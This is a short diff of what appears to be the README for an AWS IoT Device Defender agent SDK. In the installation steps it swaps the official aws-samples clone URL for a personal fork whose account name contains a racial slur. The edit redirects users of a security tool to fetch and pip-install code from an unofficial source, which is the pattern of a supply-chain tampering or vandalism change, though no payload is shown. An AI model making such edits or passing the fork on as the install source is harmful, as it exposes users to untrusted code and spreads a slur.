@@ -52,7 +52,7 @@ For detailed instructions on creating Device Defender behaviors and security pro
 1. Clone the repository
 
 ```bash
-git clone https://github.com/aws-samples/aws-iot-device-defender-agent-sdk-python.git
+git clone https://github.com/lmao-ash-niggalol/aws-iot-device-defender-agent-sdk-python.git
 ```
 
 2. Install using pip
